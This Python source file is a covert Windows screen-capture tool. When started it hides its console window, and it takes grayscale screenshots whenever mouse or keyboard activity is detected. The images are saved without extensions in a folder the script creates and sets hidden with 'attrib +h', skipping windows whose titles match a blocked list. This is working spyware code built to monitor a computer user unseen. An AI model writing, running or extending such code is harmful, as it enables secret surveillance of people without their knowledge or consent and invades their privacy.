from pynput.keyboard import Listener
from pyautogui import screenshot, position
from threading import Thread
from time import sleep
from datetime import datetime
import win32gui
import win32console
import os

from win32gui import GetWindowText, GetForegroundWindow
import DecryptionTests
import globalVariables


def Hide():
    win = win32console.GetConsoleWindow()
    win32gui.ShowWindow(win, 0)


Hide()  # placed here to speed it up, as with python it's sequential


def ScreenShot():
    # that hides the extension well
    screenshot().convert("L").save(globalVariables.screenshotsPath + "\\" + datetime.now().
                                   strftime("%d%H%M%S"),
                                   "jpeg",
                                   optimize=True,
                                   quality=75)
    globalVariables.last_screenshot_date = datetime.now()


def IsCurrentWindowNameInBlockedList():
    currentActiveWindowTitle = GetWindowText(GetForegroundWindow())
    for window in DecryptionTests.unwantedWindowTitlesSet:
        if window in currentActiveWindowTitle:
            return True
    return False


def CheckForMouseActivity():
    while True:

        sleep(5)
        # current mouse x and y
        if globalVariables.mouse_position != position() \
                or globalVariables.last_screenshot_date <= globalVariables.key_press_date:
            globalVariables.mouse_position = position()
            if not IsCurrentWindowNameInBlockedList():
                try:
                    ScreenShot()
                except Exception:   # this is here to fix a bug. Program was stopping
                    pass            # when ctrl+alt+del was pressed


def On_press(key):
    globalVariables.key_press_date = datetime.now()


def CheckForKeyActivity():
    with Listener(
            on_press=On_press) as listener:
        listener.join()


# def DeleteOnceItGetsTooBig():
#     sleep(10800)  # execute check every 3 hours
#     screenshotsPath # check size
#     # and delete if over 3 GB, make sure it doesn't move it to the bin
#     pass

# if the directory doesn't exist, create it and set to hidden
if not os.path.exists(globalVariables.screenshotsPath):
    os.mkdir(globalVariables.screenshotsPath)
    os.system("attrib +h " + globalVariables.screenshotsPath)

if __name__ == '__main__':
    Thread(target=CheckForMouseActivity).start()
    Thread(target=CheckForKeyActivity).start()
    # Thread(target=DeleteOnceItGetsTooBig).start()
